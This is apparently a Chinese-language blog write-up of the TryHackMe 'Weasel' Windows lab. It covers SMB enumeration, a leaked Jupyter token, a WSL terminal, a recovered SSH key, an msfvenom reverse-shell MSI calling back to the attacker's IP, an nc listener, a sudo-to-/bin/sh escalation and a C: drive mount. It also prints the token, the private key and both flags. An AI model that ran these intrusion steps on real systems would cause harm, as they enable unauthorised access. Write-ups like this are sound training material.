---
title: THM Weasel
published: 2025-08-04
tags: [THM,Windows]
category: PenTest
draft: false
image: 'image.png'
---

## Recon

- 47001 是架設靶機環境預設會開的 port ，不用管他

```bash=
┌──(kali😺dkri3c1)-[~]
└─$ rustscan -a 10.10.70.52 -r 1-65535 --ulimit 5000 -- -sC -sV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports like it's my full-time job. Wait, it is.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.70.52:22
Open 10.10.70.52:135
Open 10.10.70.52:139
Open 10.10.70.52:445
Open 10.10.70.52:5985
Open 10.10.70.52:8888
Open 10.10.70.52:47001
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -Pn" on ip 10.10.70.52
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 09:18 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:18
Completed NSE at 09:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:18
Completed NSE at 09:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:18
Completed NSE at 09:18, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 09:18
Completed Parallel DNS resolution of 1 host. at 09:18, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 09:18
Scanning 10.10.70.52 [7 ports]
Discovered open port 5985/tcp on 10.10.70.52
Discovered open port 8888/tcp on 10.10.70.52
Discovered open port 139/tcp on 10.10.70.52
Discovered open port 22/tcp on 10.10.70.52
Discovered open port 445/tcp on 10.10.70.52
Discovered open port 135/tcp on 10.10.70.52
Discovered open port 47001/tcp on 10.10.70.52
Completed SYN Stealth Scan at 09:18, 0.33s elapsed (7 total ports)
Initiating Service scan at 09:18
Scanning 7 services on 10.10.70.52
Completed Service scan at 09:18, 23.38s elapsed (7 services on 1 host)
NSE: Script scanning 10.10.70.52.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:18
Completed NSE at 09:18, 11.95s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:18
Completed NSE at 09:18, 1.30s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:18
Completed NSE at 09:18, 0.00s elapsed
Nmap scan report for 10.10.70.52
Host is up, received user-set (0.29s latency).
Scanned at 2025-07-26 09:18:21 EDT for 37s

PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 124 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBae1NsdsMcZJNQQ2wjF2sxXK2ZF3c7qqW3TN/q91pWiDee3nghS1J1FZrUXaEj0wnAAAbYRg5vbRZRP9oEagBwfWG3QJ9AO6s5UC+iTjX+YKH6phKNmsY5N/LKY4+2EDcwa5R4uznAC/2Cy5EG6s7izvABLcRh3h/w4rVHduiwrueAZF9UjzlHBOxHDOPPVtg+0dniGhcXRuEU5FYRA8/IPL8P97djscu23btk/hH3iqdQWlC9b0CnOkD8kuyDybq9nFaebAxDW4XFj7KjCRuuu0dyn5Sr62FwRXO4wu08ePUEmJF1Gl3/fdYe3vj+iE2yewOFAhzbmFWEWtztjJb
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOGl51l9Z4Mg4hFDcQz8v6XRlABMyVPWlkEXrJIg53piZhZ9WKYn0Gi4fKkzo3blDAsdqpGFQ11wwocBCSJGjQU=
|   256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHw9uTZkIMEgcZPW9Z28Mm+FX66+hkxk+8rOu7oI6J9
135/tcp   open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 124 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 124
5985/tcp  open  http          syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8888/tcp  open  http          syn-ack ttl 124 Tornado httpd 6.0.3
|_http-favicon: Unknown favicon MD5: 97C6417ED01BDC0AE3EF32AE4894FD03
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
| http-methods:
|_  Supported Methods: GET
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: TornadoServer/6.0.3
47001/tcp open  http          syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-07-26T13:18:46
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: -1s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 34816/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 21907/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 22310/udp): CLEAN (Failed to receive data)
|   Check 4 (port 22306/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:18
Completed NSE at 09:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:18
Completed NSE at 09:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:18
Completed NSE at 09:18, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.68 seconds
           Raw packets sent: 7 (308B) | Rcvd: 7 (308B)
```

## Exploit

他有開 445 port，對應到 samba ，用 smbclient 列列看有哪些目錄

![image](https://hackmd.io/_uploads/rJnHu8MDle.png)

之後去讀 `datasci-team` 這個資料夾裡面的東西，然後一個一個把它 get 下來

![image](https://hackmd.io/_uploads/rJJddUfwgx.png)

在 `misc` 這個資料夾找到 `jupyter-token.txt`

```bash=
┌──(kali㉿kali)-[~/thm]
└─$ smbclient //10.10.10.36/datasci-team 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Thu Aug 25 11:27:02 2022
  ..                                  D        0  Thu Aug 25 11:27:02 2022
  .ipynb_checkpoints                 DA        0  Thu Aug 25 11:26:47 2022
  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 11:26:46 2022
  misc                               DA        0  Thu Aug 25 11:26:47 2022
  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 11:26:46 2022
  papers                             DA        0  Thu Aug 25 11:26:47 2022
  pics                               DA        0  Thu Aug 25 11:26:47 2022
  requirements.txt                    A       12  Thu Aug 25 11:26:46 2022
  weasel.ipynb                        A     4308  Thu Aug 25 11:26:46 2022
  weasel.txt                          A       51  Thu Aug 25 11:26:46 2022

                15587583 blocks of size 4096. 8918797 blocks available
smb: \> cd misc
smb: \misc\> ls
  .                                  DA        0  Thu Aug 25 11:26:47 2022
  ..                                 DA        0  Thu Aug 25 11:26:47 2022
  jupyter-token.txt                   A       52  Thu Aug 25 11:26:47 2022

                15587583 blocks of size 4096. 8926011 blocks available
smb: \misc\> 


┌──(kali㉿kali)-[~/thm]
└─$ cat jupyter-token.txt 
067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a


```

連上去他的 jupyter 的網頁，在 port 8888

![Screenshot 2025-07-28 at 3.41.03 PM](https://hackmd.io/_uploads/SkGsFoVPex.png)

把 token 拿過去用，就可以可以進入後台了

`067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a`

![Screenshot 2025-07-28 at 3.42.00 PM](https://hackmd.io/_uploads/HJwRFo4Dgl.png)

在他右上角有一個選項可以選擇 terminal

![Screenshot 2025-07-28 at 4.38.21 PM](https://hackmd.io/_uploads/BJjZPhVvgg.png)

進去先 `uname -a`，得知是 wsl
```bash=
Linux DEV-DATASCI-JUP 4.4.0-17763-Microsoft #2268-Microsoft Thu Oct 07 16:36:00 PST 2021 x86_64 x86_64 x86_64 GNU/Linux
```
在終端機找到 ssh private key 

![Screenshot 2025-07-28 at 4.48.16 PM](https://hackmd.io/_uploads/rJlPthEPll.png)

```bash=
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+YwAAAKjQ358n0N+f
JwAAAAtzc2gtZWQyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+Yw
AAAED9OhQumFOiC3a05K+X6h22gQga0sQzmISvJJ2YYfKZWVSh7llJ7PMLrlRmFa3h1u/E
qiv502CASG53Mr4lKz5jAAAAI2Rldi1kYXRhc2NpLWxvd3ByaXZAREVWLURBVEFTQ0ktSl
VQAQI=
```

發現他不給連

```bash=
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ sudo ssh -i id_rsa dev-datasci@10.10.252.243
[sudo] password for kali: 
Warning: Identity file id_rsa not accessible: No such file or directory.
dev-datasci@10.10.252.243: Permission denied (publickey,keyboard-interactive).
                     
```

sudo -l 但是那個目錄沒有指令

![Screenshot 2025-07-28 at 4.56.31 PM](https://hackmd.io/_uploads/rkyLshNDll.png)



![Screenshot 2025-07-28 at 5.07.58 PM](https://hackmd.io/_uploads/ryng0hNwel.png)

在 `/home/dev-datasci/.local/share/jupyter` 找到 `notebook_secret` 看起來也沒用

這邊有個想法 , 就是把 `jupyter` 直接寫成 `/bin/sh`

![Screenshot 2025-07-28 at 5.51.55 PM](https://hackmd.io/_uploads/rycH_6Evle.png)

提權成功 ， 看起來是兔子洞

```bash=
root@DEV-DATASCI-JUP:/var# uname -a
Linux DEV-DATASCI-JUP 4.4.0-17763-Microsoft #2268-Microsoft Thu Oct 07 16:36:00 PST 2021 x86_64 x86_64 x86_64 GNU/Linux
```

回頭思考解題流程，發現私鑰的使用方式可能有誤，私鑰的型式: `<userid>_id_ed????`，所以我們在使用 ssh 時候使用者名稱錯了，真正的使用者是`dev-datasci-lowpriv`

這邊還有踩一個坑就是 private key 如果權限開太大會用不了


![Screenshot 2025-07-29 at 9.25.17 AM](https://hackmd.io/_uploads/BJhWmiHvgl.png)

連上去可以直接打 `powershell` 進 powershell

```bash=
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>powershell     
Windows PowerShell                                                              
Copyright (C) Microsoft Corporation. All rights reserved.                       
                                                                                
PS C:\Users\dev-datasci-lowpriv>                                                
```


> Get user Flag: THM{w3as3ls_@nd_pyth0ns}

接下來研究提權利用 python3 server 去傳 winPeas

架起來
```bash=
┌──(kali㉿kali)-[/usr/share/peass/winpeas]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.17.9.114 - - [28/Jul/2025 21:28:45] "GET / HTTP/1.1" 200 -
10.17.9.114 - - [28/Jul/2025 21:28:45] code 404, message File not found
10.17.9.114 - - [28/Jul/2025 21:28:45] "GET /favicon.ico HTTP/1.1" 404 -
10.10.16.42 - - [28/Jul/2025 21:29:12] "GET /winPEASx64.exe HTTP/1.1" 200 -
```

在受害機器上下載

```bash=
PS C:\Users\dev-datasci-lowpriv\Desktop> curl 10.17.9.114/winPEASx64.exe -o winp
eas.exe                                                                         
PS C:\Users\dev-datasci-lowpriv\Desktop> ls                                     
                                                                                
                                                                                
    Directory: C:\Users\dev-datasci-lowpriv\Desktop                             
                                                                                
                                                                                
Mode                LastWriteTime         Length Name                           
----                -------------         ------ ----                           
-a----        8/25/2022   5:21 AM       28916488 python-3.10.6-amd64.exe        
-a----        8/25/2022   7:40 AM             27 user.txt                       
-a----        7/28/2025   6:29 PM       10144256 winpeas.exe  
```

winPeas 上傳之後

```bash=
+----------¦ Checking AlwaysInstallElevated                                                 
+  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/i
ndex.html#alwaysinstallelevated                                                                           
    AlwaysInstallElevated set to 1 in HKLM!                                                        
    AlwaysInstallElevated set to 1 in HKCU!  
```

發現 HKLM 跟 HCKU 都是 0x1 ，所以我們可以上傳 msi 的安裝檔試試看

製作安裝檔:

```bash=
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.9.114 LPORT=6969 -f msi -o exp.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: exp.msi
```

把環境架起來

![Screenshot 2025-07-29 at 9.48.43 AM](https://hackmd.io/_uploads/BycFusHPxe.png)

在 local 端監聽

```bash=
nc -lvnp 6969
```

然後在受害者那邊

```bash=
msiexec /quite /qn /i <filename>
```

結果就失敗了



回想起前面的流程，懷疑可以將 Windows 的 C 槽整個掛載到 Linux 上，參考這篇


https://www.scivision.dev/mount-usb-drives-windows-subsystem-for-linux/



```bash=
mount -t drvfs 'c:' /mnt/c
```

掛載完之後就可以 Get Root

![Screenshot 2025-07-29 at 10.37.52 AM](https://hackmd.io/_uploads/B1yG4hSvge.png)


> Get Root Flag: THM{evelated_w3as3l_l0ngest_boi}

## Pwned!


![Screenshot 2025-07-29 at 10.38.44 AM](https://hackmd.io/_uploads/H1zr43SDlx.png)
